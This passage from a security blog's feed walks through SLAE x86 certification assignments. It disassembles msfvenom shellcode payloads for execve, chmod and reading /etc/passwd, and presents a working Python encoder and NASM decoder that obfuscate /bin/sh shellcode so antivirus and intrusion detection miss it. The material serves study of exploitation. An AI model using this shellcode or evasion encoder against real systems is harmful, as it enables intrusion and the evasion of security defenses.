&lt;p&gt;The execve() executes the program pointed to by filename. The &lt;code&gt;argv&lt;/code&gt; is an array of argument strings passed to the new program.  By convention, the first of these strings should contain the filename associated with the file being executed. The  &lt;code&gt;envp&lt;/code&gt; is an array of strings, conventionally of the form key=value, which are passed as environment to the new program.  Both &lt;code&gt;argv&lt;/code&gt; and &lt;code&gt;envp&lt;/code&gt;  must  be terminated by a NULL pointer.&lt;/p&gt;

&lt;p&gt;In the above output of sctest we can see the pointer &lt;code&gt;dateiname&lt;/code&gt; is pointing to the filename &lt;code&gt;/bin/sh&lt;/code&gt;. So &lt;code&gt;/bin/sh&lt;/code&gt; is executed by execve. The &lt;code&gt;argv&lt;/code&gt; array contains the strings starting with the filename of the file being executed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;argv = ['/bin/sh', '-c', 'id', NULL]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We are not making any changes to the environment, so &lt;code&gt;envp&lt;/code&gt; contains NULL.&lt;/p&gt;

&lt;p&gt;Now let us verify this using &lt;strong&gt;GDB&lt;/strong&gt;. Insert the shellcode in the template c file and compile.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
unsigned char code[] = \
&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x69\x64\x00\x57\x53\x89\xe1\xcd\x80&quot;;
main()
{
	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Open the executable in GDB (I am using GDB PEDA) and set a break point at the begnning of execution of our shellcode. This can be done using the command &lt;code&gt;break *&amp;amp;code&lt;/code&gt;. Lets look at the disassembly of the funtion &lt;code&gt;code&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-gdb-01-disas.PNG&quot; alt=&quot;asn-5-exec-gdb-01-disas&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the disassembly we dont see the int 0x80 which will execute the system call. Let us set a break point at the address of the instruction &lt;code&gt;call   0x804a060 &amp;lt;code+32&amp;gt;&lt;/code&gt;, ie at &lt;code&gt;0x0804a058&lt;/code&gt; and continue execution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-gdb-02-call.PNG&quot; alt=&quot;asn-5-exec-gdb-02-call&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the stack, we see the strings &lt;code&gt;&quot;/bin/sh&quot;, &quot;-c&quot;&lt;/code&gt; but we still dont see the command &lt;code&gt;id&lt;/code&gt; which we actually wanted execute. Now the EIP is at the address of the &lt;code&gt;call   0x804a060 &amp;lt;code+32&amp;gt;&lt;/code&gt; instruction. Once the call is executed, the address of instruction next to it will be pushed on to the stack. Which is &lt;code&gt;0x804a05d&lt;/code&gt; and the instuction at that address does not make any sense. Lets examine the string at this address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-gdb-02-call-01.PNG&quot; alt=&quot;asn-5-exec-gdb-02-call-01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There we have it. The command &lt;code&gt;id&lt;/code&gt; that we wanted to execute. Now let us step through the execution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-gdb-03-step.PNG&quot; alt=&quot;asn-5-exec-gdb-03-step&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we see the &lt;code&gt;int 0x80&lt;/code&gt; instruction which will actually call the system call. Lets set a break point at this address &lt;code&gt;0x0804a064&lt;/code&gt; and continue execution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-gdb-05-execve-call.PNG&quot; alt=&quot;asn-5-exec-gdb-05-execve-call&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;int 0x80&lt;/code&gt; instruction at &lt;code&gt;0x0804a064&lt;/code&gt; invokes the execve system call with the required parameters. The register layout just before the system call is as follows.&lt;/p&gt;

&lt;p&gt;EAX = 0xb = execve()&lt;/p&gt;

&lt;p&gt;EBX = Pointer to the filename of the file to be executed - “/bin/sh”&lt;/p&gt;

&lt;p&gt;ECX = Pointer to argv&lt;/p&gt;

&lt;p&gt;EDX = envp = NULL&lt;/p&gt;

&lt;p&gt;Once the execve system call is completed, there is no need for another exit system call. This is because execve() does not return on success, and the text, data, bss, and stack of the calling process are overwritten by that of the program loaded.&lt;/p&gt;

&lt;h3 id=&quot;2-chmod---linuxx86chmod---ndisasm&quot;&gt;#2. CHMOD - linux/x86/chmod - [NDISASM]&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;linux/x86/chmod&lt;/code&gt; runs chmod on specified file with specified mode. The chmod command is used to set permission of files. Let us look at the msfvenom payload options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-chmod-payload-options-00.PNG&quot; alt=&quot;asn-5-chmod-payload-options-00&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to set two options, FILE and MODE while generating the payload. below are the values I chose for these two options.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FILE=/tmp/ub3r
MODE=0600
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let us generate the shellcode with the following command.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfvenom -p linux/x86/chmod FILE=/tmp/ub3r MODE=0600 -f c | cut -d '&quot;' -f 2 | tr -d '\n'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-chmod-payload-gen.PNG&quot; alt=&quot;asn-5-chmod-payload-gen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Make sure the shellcode works. Insert the shellcode in the template file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
unsigned char code[] = \
&quot;\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f\x75\x62\x33\x72\x00\x5b\x68\x80\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80&quot;;
main()
{
	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compile and execute (The shellcode length are not correct as there are null bytes in the shellcode).
&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-chmod-execution.PNG&quot; alt=&quot;asn-5-chmod-execution&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Having generated the shellcode, lets start analyzing the shellcode using &lt;strong&gt;NDISASM&lt;/strong&gt;. The following command is used to dump the assembly instructions from the shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo -ne &quot;\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f\x75\x62\x33\x72\x00\x5b\x68\x80\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80&quot; | ndisasm -u -
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-chmod-ndisasm.PNG&quot; alt=&quot;asn-5-chmod-ndisasm&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We will go through each assembly instruction and try to interpret the meaning.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000  99                cdq                         ; Clears EDX; EDX = 0x0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The CDQ (Convert Doubleword to Quadword) instruction extends the sign bit of EAX into the EDX register.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000001  6A0F              push byte +0xf		; PUSH 0xf onto stack
00000003  58                pop eax			; Clears EAX and POPs the value 0xf into EAX; EAX = 0xf
							; sys_chmod
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since &lt;code&gt;EAX=0xf&lt;/code&gt;, we know which system call is going to be executed. The &lt;code&gt;SYS_CHMOD&lt;/code&gt; system call. Before we proceed further, lets see which registers will be holding the parameters for the system call.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
EAX = 0x0f = sys_chmod

EBX = const char __user *filename = Pointer to the filename

ECX = mode_t mode

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets continue analysing the assembly instructions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000004  52                push edx			; EDX = 0x0 is PUSHed onto stack
00000005  E80A000000        call dword 0x14
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Once the &lt;code&gt;call dword 0x14&lt;/code&gt; instruction at &lt;code&gt;0x00000005&lt;/code&gt; is executed, the five instructions from &lt;code&gt;0x0000000A&lt;/code&gt; to &lt;code&gt;00000011&lt;/code&gt; are skipped and seems useless. That does not make any sense, right?. Lets examine these instructions and their shellcode bytes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000A  2F                das				; '2F746D702F7562337200'.decode('hex') = '/tmp/ub3r\x00'
0000000B  746D              jz 0x7a
0000000D  702F              jo 0x3e
0000000F  7562              jnz 0x73
00000011  337200            xor esi,[edx+0x0]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The shellcode bytes corresponding to these five instrcution is &lt;code&gt;2F746D702F7562337200&lt;/code&gt; which is hex equivalent of the filename (null terminated) that we want to set permission on - “/tmp/ub3r\x00”. We can verify this with the following python one liner.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;python -c &quot;print '2F746D702F7562337200'.decode('hex')&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So when the &lt;code&gt;call dword 0x14&lt;/code&gt; instruction is executed, the address of instruction next to it is pushed onto the stack. we already know that this is nothing but the address pointing to the filename. Now let us examine the rest of the shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000014  5B                pop ebx			; ebx = address pointing to filename = '/tmp/ub3r' null terminated
00000015  6880010000        push dword 0x180		; permission in octal; 0x180 = 0600 octal
0000001A  59                pop ecx			; ecx = 0600
0000001B  CD80              int 0x80			; execute the sys_chmod system call
0000001D  6A01              push byte +0x1
0000001F  58                pop eax			; EAX = 0x1 = exit systemcall
00000020  CD80              int 0x80			; execute exit system call
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;int 0x80&lt;/code&gt; at &lt;code&gt;0000001B&lt;/code&gt; executes the sys_chmod system call. The arguments for the system call are stored in ebx and ecx. The rest of the shellcode from &lt;code&gt;0x0000001D&lt;/code&gt; to &lt;code&gt;0x00000020&lt;/code&gt; is to call exit system call.&lt;/p&gt;

&lt;h3 id=&quot;3-read_file---linuxx86read_file---ndisasm&quot;&gt;#3. READ_FILE - linux/x86/read_file - [NDISASM]&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;linux/x86/read_file&lt;/code&gt; reads up to 4096 bytes from the local file system and write it back out to the specified file descriptor. Lets look at the payload options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-readfile-payload-options.PNG&quot; alt=&quot;asn-5-readfile-payload-options&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to set two options, FD(the file descriptor to write output to) and PATH(the file path to read). We will generate a shellcode to read the file &lt;code&gt;/etc/passwd&lt;/code&gt; and write it to the &lt;code&gt;stdout&lt;/code&gt;. Generate the shellcode with the options &lt;code&gt;FD=1&lt;/code&gt;(stdout) and &lt;code&gt;PATH=/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msfvenom -p linux/x86/read_file PATH=/etc/passwd -f c | cut -d '&quot;' -f 2 | tr -d '\n'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-readfile-payload-gen.PNG&quot; alt=&quot;asn-5-readfile-payload-gen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Make sure the shellcode works. Insert the shellcode in the template file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00&quot;;

main()
{
	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compile and execute (the shellcode length are not correct as there are null bytes in the shellcode).
&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-readfile-execution.PNG&quot; alt=&quot;asn-5-readfile-execution&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dump the assembly instructions from shellcode using &lt;strong&gt;NDISASM&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo -ne &quot;\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00&quot; | ndisasm -u -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-readfile-ndisasm-dump.PNG&quot; alt=&quot;asn-5-readfile-ndisasm-dump&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets analyze the assembly code line by line. We will analyze the instructions from &lt;code&gt;0x00000002&lt;/code&gt; to &lt;code&gt;0x00000036&lt;/code&gt; after we analyze the following snippet.&lt;/p&gt;

&lt;h4 id=&quot;get-address-of-filename-string---jmp-call-pop&quot;&gt;Get address of filename string - JMP-CALL-POP&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;00000000  EB36              jmp short 0x38
	..........................
        &amp;lt;0x00000002 to 0x00000036&amp;gt;
        ..........................
00000038  E8C5FFFFFF        call dword 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When the &lt;code&gt;jmp short 0x38&lt;/code&gt; instruction is executed, the execution control is passed to the instruction at&lt;code&gt;0x00000038&lt;/code&gt;, ie &lt;code&gt;call dword 0x2&lt;/code&gt;. When the &lt;code&gt;call&lt;/code&gt; instruction is executed, the address of instruction next to it(&lt;code&gt;0x0000003D&lt;/code&gt;) is pushed on to the stack. Let us examine what is there at this address. If we look at the shellcode bytes from &lt;code&gt;0000003D&lt;/code&gt; to &lt;code&gt;00000048&lt;/code&gt;, we can see that this is the filename of the file we want to read. Let us decode these bytes using the following python one liner.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python -c &quot;print '2f6574632f706173737764'.decode('hex')&quot;
/etc/passwd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The NULL byte at &lt;code&gt;0x00000048&lt;/code&gt; acts as null terminator for the filname string. Once the &lt;code&gt;call dword 0x2&lt;/code&gt; is executed, the top of the stack will contain the address pointing our filename. Now lets examine the rest of the shellcode from &lt;code&gt;0x00000002&lt;/code&gt; to &lt;code&gt;0x00000036&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;open-file-in-o_rdonly---int-openconst-char-pathname-int-flags&quot;&gt;Open file in O_RDONLY - int open(const char *pathname, int flags);&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;00000002  B805000000        mov eax,0x5			; eax = 0x5 ; sys_open
00000007  5B                pop ebx			; ebx = /etc/passwd address ; const char __user *filename
00000008  31C9              xor ecx,ecx			; ecx = 0 ; int flags
0000000A  CD80              int 0x80			; execute sys_open
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets try to understand which system call is being called in the above snippet. For that we will look at the register values.&lt;/p&gt;

&lt;p&gt;EAX = 0x5	; sys_open system call&lt;/p&gt;

&lt;p&gt;EBX = argument 1 for open; 	The address pointing to the filename(&lt;code&gt;/etc/passwd&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;ECX = argument 2 for open;	0		; O_RDONLY&lt;/p&gt;

&lt;p&gt;So the &lt;strong&gt;sys_open&lt;/strong&gt; system call is being called and the arguments for the open system call are stored in EBX and ECX. Once the sys_open system call is successfully executed, EAX will have the file descriptor returned by the system call.&lt;/p&gt;

&lt;h4 id=&quot;read-file-contents-and-store-in-a-buffer---ssize_t-readint-fd-void-buf-size_t-count&quot;&gt;Read file contents and store in a buffer - ssize_t read(int fd, void *buf, size_t count);&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;0000000C  89C3              mov ebx,eax			; eax has open fd, copy it to ebx
0000000E  B803000000        mov eax,0x3			; eax = 0x3 ; sys_read
00000013  89E7              mov edi,esp			; save esp in edi
00000015  89F9              mov ecx,edi			; ecx = *buf	; points to the stack
00000017  BA00100000        mov edx,0x1000		; edx = 0x1000 ; 4096 ; count
0000001C  CD80              int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets examine the register values.&lt;/p&gt;

&lt;p&gt;EAX = 0x3	; sys_read&lt;/p&gt;

&lt;p&gt;EBX = argument 1 for read; open file descriptor&lt;/p&gt;

&lt;p&gt;ECX = argument 2 for read; address pointing to the top of stack&lt;/p&gt;

&lt;p&gt;EDX = argument 3 for read; 0x1000 = 4096&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;sys_read&lt;/strong&gt; system call is invoked, the arguments for the system call are stored in EBX, ECX and EDX. The above snippet reads upto 4096 bytes from the open file pointed by file descriptor in EBX and stores in buffer pointed ECX. Once the system call is executed successfully, the file contents will be stored on stack and the number of bytes read is returned to EAX.&lt;/p&gt;

&lt;h4 id=&quot;write-the-buffer-content-to-stdout---ssize_t-writeint-fd-const-void-buf-size_t-count&quot;&gt;Write the buffer content to stdout - ssize_t write(int fd, const void *buf, size_t count);&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;0000001E  89C2              mov edx,eax			; edx = size_t count ; number of bytes to write
00000020  B804000000        mov eax,0x4			; eax = 0x4 ; sys_write
00000025  BB01000000        mov ebx,0x1			; ebx = 0x1 ; stdout
0000002A  CD80              int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets examine the registers.&lt;/p&gt;

&lt;p&gt;EAX = 0X4 ; sys_write system call&lt;/p&gt;

&lt;p&gt;EBX = argument 1 for write; 0x1; write to stdout&lt;/p&gt;

&lt;p&gt;ECX = argument 2 for write; *buf; address pointing to the top of stack&lt;/p&gt;

&lt;p&gt;EDX = argument 2 for write; how many bytes to write&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;sys_write&lt;/strong&gt; system call is invoked. Once executed successfully, the file contents in the buffer and written to the stdout.&lt;/p&gt;

&lt;p&gt;The rest of the instructions are to exit the program by calling &lt;strong&gt;sys_exit&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000002C  B801000000        mov eax,0x1			; sys_exit
00000031  BB00000000        mov ebx,0x0			; return code
00000036  CD80              int 0x80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we are done :)&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment 4 - Custom Encoder/Decoder (XNRR3AX)</title>
   <link href="http://localhost:4000/2017/08/21/slae-x86-assignment-4-custom-encoder/"/>
   <updated>2017-08-21T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/08/21/slae-x86-assignment-4-custom-encoder</id>
   <content type="html">&lt;p&gt;The fourth assignment is to create a custom shellcode encoder and decoder. The whole point of encoding shellcode is change its signature so that the shellcode is not detected by Antivirus softwares and Intrution Detection Systems. This is critical in most of real world exploitation scenarios where AV and IDS are present. The encoder will change the original shellcode into some other shellcode which in assembly might seem like meaningless instructions. Upon execution, the decoder stub present before the encoded shellcode will decode the encoded shellcode and once completed will jump to the decoded shellcode.&lt;/p&gt;

&lt;p&gt;Here is how we are going to implement the encoder.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;XOR each byte of the original shellcode with 0xAA.&lt;/li&gt;
  &lt;li&gt;Apply NOT operation on each byte of the shellcode.&lt;/li&gt;
  &lt;li&gt;Rotate to Right the whole shellcode 3 times.&lt;/li&gt;
  &lt;li&gt;Apply Additive XOR operation on the whole shellcode.&lt;/li&gt;
&lt;/ol&gt;

&lt;!-- more --&gt;

&lt;p&gt;Steps 1 and 2 are self explanatory. Let us look at how rotaion works, just for the sake of understading.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Let the original shellcode be: ABCDEFG&lt;/li&gt;
  &lt;li&gt;After one right rotation: GABCDEF&lt;/li&gt;
  &lt;li&gt;After second right rotation: FGABCDE&lt;/li&gt;
  &lt;li&gt;After third right rotation: EFGABCD&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Decoding the rotation is dead simple. During decoding we will rotate the whole shellcode to left 3 times. After first three stages of encoding, the partially encoded shellcode is passed to stage 4 of our encoder. Let us look at what we will be doing in stage 4 of our encoder.&lt;/p&gt;

&lt;h3 id=&quot;additive-xor-operation-xor-kung-fu&quot;&gt;Additive XOR operation [XOR Kung Fu]&lt;/h3&gt;

&lt;p&gt;Let our original shellcode be : A1, A2, A3, A4, A5. Then we can represent our encoded shellcode as : B1, B2, B3, B4, B5. Where each byte of the encoded shellcode is computed as follows:&lt;/p&gt;

&lt;p&gt;B1 = A1&lt;/p&gt;

&lt;p&gt;B2 = A1⊕A2 = B1⊕A2&lt;/p&gt;

&lt;p&gt;B3 = A1⊕A2⊕A3 = B2⊕A3&lt;/p&gt;

&lt;p&gt;B4 = A1⊕A2⊕A3⊕A4 = B3⊕A4&lt;/p&gt;

&lt;p&gt;B5 = A1⊕A2⊕A3⊕A4⊕A5 = B4⊕A5&lt;/p&gt;

&lt;p&gt;We can use the following operations to get back each byte of the shellcode from Additive XOR encoded shellcode.&lt;/p&gt;

&lt;p&gt;A1 = B1&lt;/p&gt;

&lt;p&gt;A2 = B2⊕B1 = (A1⊕A2) ⊕ A1 = A2&lt;/p&gt;

&lt;p&gt;A3 = B3⊕B2 = (A1⊕A2⊕A3) ⊕ (A1⊕A2) = A3&lt;/p&gt;

&lt;p&gt;A4 = B4⊕B3 = (A1⊕A2⊕A3⊕A4) ⊕ (A1⊕A2⊕A3) = A4&lt;/p&gt;

&lt;p&gt;A5 = B5⊕B4 = (A1⊕A2⊕A3⊕A4⊕A5) ⊕ (A1⊕A2⊕A3⊕A4) = A5&lt;/p&gt;

&lt;h3 id=&quot;xnrr3ax-encoder&quot;&gt;XNRR3AX Encoder&lt;/h3&gt;
&lt;p&gt;Below is the XNRR3AX encoder written in python which encodes the given shellcode and spits out the encoded shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/env python
# Author	: RIZAL MUHAMMED(UB3RSiCK)
# Description	: XNRR3AX Encoder
# Filename 	: xnrr3ax-encoder.py
# XOR, NOT, ROTATE RIGHT 3, ADDITIVE XOR Encoder

from collections import deque
import sys

# Shellcode dumped from the execve /bin/sh
shellcode = (&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;)

# Insert bad characters in this list
badchars = [r&quot;\x00&quot;]

encoded_shellcode = &quot;&quot;
encoded_shellcode2 = &quot;&quot;

temp_shellcode = []

for x in bytearray(shellcode):

	# XOR with 0xAA	
	xorred = x^0xAA
	# Applying NOT
	negated = ~xorred

	temp_shellcode.append(int('0x'+'%02x'%(negated &amp;amp; 0xff), 16))

# Convert temp_shellcode list to Deque
dq_es = deque(temp_shellcode)
# Rotate Right 3 times 
dq_es.rotate(3)

bas = list(dq_es)

# Additive XOR

encoded_shellcode += &quot;0x&quot;
encoded_shellcode += &quot;%02x,&quot; % bas[0]

encoded_shellcode2 += r&quot;\x&quot;
encoded_shellcode2 += &quot;%02x&quot; % bas[0]

for idx in range(len(bas)-1):
	
	if idx == 0:
		prev_xor = bas[idx]
	
	# XOR next byte with previous xor result	
	xorred = prev_xor^bas[idx+1]
	prev_xor = xorred
		
	encoded_shellcode += &quot;0x&quot;
	encoded_shellcode += &quot;%02x,&quot; % (xorred)

	encoded_shellcode2 += r&quot;\x&quot;
	encoded_shellcode2 += &quot;%02x&quot; % (xorred)

# check for bad characters in encoded shellcode 
for badchar in badchars:
	if badchar.lower() in encoded_shellcode2:
		print r&quot;Bad character {} in Shellcode&quot;.format(badchar)
		sys.exit()
	
print 'Encoded Opt_1 : ', encoded_shellcode2
print 'Encoded Opt_2 : ', encoded_shellcode.rstrip(',')
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets run the encoder and produce the encoded shellcode.
&lt;img src=&quot;/assets/asn-4-encoder-out.PNG&quot; alt=&quot;XNRR3AX Encoder&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;xnrr3ax-decoder&quot;&gt;XNRR3AX Decoder&lt;/h3&gt;
&lt;p&gt;Now that we have our encoder, we need to write a decoder stub which will decode the encoded shellcode and pass control to it. Let us look at the stages of decoding.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Reverse the Additive XOR operation.&lt;/li&gt;
  &lt;li&gt;Rotate to Left the whole shellcode 3 times.&lt;/li&gt;
  &lt;li&gt;XOR each byte of the original shellcode with 0xAA.&lt;/li&gt;
  &lt;li&gt;Apply NOT operation on each byte of the shellcode.&lt;/li&gt;
  &lt;li&gt;Jump to decoded shellcode.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Without further ado, let us look at the decoder implementation.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;;
; Author 	: RIZAL MUHAMMED (UB3RSiCK)
; Desc		: XNRR3AX Decoder
; Note		: XORRED WITH 0XAA	
; Filename	: xnrr3ax-decoder.nasm

; 1) Reverse Additive XOR
; 2) Rotate Left 3 times
; 3) Apply XOR, NOT operation on each byte
; 4) Jump to decoded shellcode 


global _start

section .text
	_start:
		
		jmp short get_shellcode_addr
	
		shellcode_addr:
			
			pop esi				; pointer to shellcode 
			
			xor eax, eax
			xor ebx, ebx
			xor ecx, ecx			; clear registers needed
			xor edx, edx
			
			push esi			; esi has pointer to shellcode 
			pop edi				; clears edi and saves pointer to shellcode in edi

;################################################################################################
	
			; Reverse Additive XOR
			
			mov cl, l_sc - 1		; clears cl and init with loop counter

			mov bl, byte [esi] 		; move first byte of shellcode to ebx

			decoder:
				mov al, byte [esi + 1]	; save a copy of byte [esi + 1] in al, used in next xor operation
				xor byte [esi + 1], bl	; xor byte [esi + 1] with encoded byte in bl
				mov bl, al		; [esi +1] is decoded now, for next stage we require encoded value which is saved in al
				inc esi
				loop decoder

			mov esi, edi			;restore pointer to shellcode in esi
;################################################################################################

			; Rotate left 3 times
			
			mov cl, 0x3			; rotate left 3 times
			shift:	
				push esi			; save pointer to shellcode on stack for later use
				mov bl, byte [esi]		; save byte [esi] in bl

				mov dl, l_sc-1		; shift_loop runs len(shellcode) - 1 times
				shift_loop:

					lea edi, [esi]		; save address of [esi] in edi
					mov al, byte [esi +1]	; move byte [esi + 1] to al
					mov byte [edi], al	; move byte in al to [esi]
					inc esi			; increment esi
					dec dl			; decrement shift_loop counter
					jnz shift_loop
				mov byte [esi], bl		; the first element is saved in the last
				pop esi				; move shellcode address to esi
				loop shift 	

;################################################################################################
			
			; Apply XOR and NOT on each byte

			mov cl, l_sc			; move length of shellcode to ecx
			
			decode_loop:
				not byte [esi]			; Apply NOT operation 
				xor byte [esi], 0xAA		; XOR with 0xAA
				inc esi
				
				loop decode_loop

				jmp short shellcode		; Decoding is complete, jump to the shellcode


		get_shellcode_addr:
			call shellcode_addr
			shellcode: db 0x5e,0xc6,0x13,0x77,0xe2,0xe7,0xda,0xa0,0xda,0xfc,0xc1,0xfc,0x86,0xb1,0x8d,0xb6,0x6a,0xdc,0xd9,0x05,0xb2,0xb4,0x68,0xdc,0x39
			l_sc equ $-shellcode
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Assembling, Linking and Dumping shellcode.
